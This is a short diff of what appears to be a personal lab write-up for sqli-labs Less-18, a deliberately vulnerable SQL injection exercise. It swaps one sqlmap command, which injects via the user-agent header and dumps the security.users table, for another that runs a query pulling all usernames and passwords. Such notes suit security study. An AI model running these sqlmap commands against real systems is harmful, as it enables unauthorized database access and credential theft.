@@ -25,5 +25,6 @@ print_r(mysql_error());
 
 ---
 sqlmap
-1. 指定 -p user-agent
-sqlmap -u "http://10.3.187.26:8848/Less-18/" --data="uname=Dumb&passwd=Dumb" --batch --level=3 -p "user-agent" --dbms=mysql -D security -T users --dump
+sqlmap -u "ip/Less-18/" --data="uname=Dumb&passwd=Dumb" --batch --level=3 --sql-query="select group_concat(username,0x3a,password) from security.users"
+![](assets/Less18/file-20260531180647799.png)
+
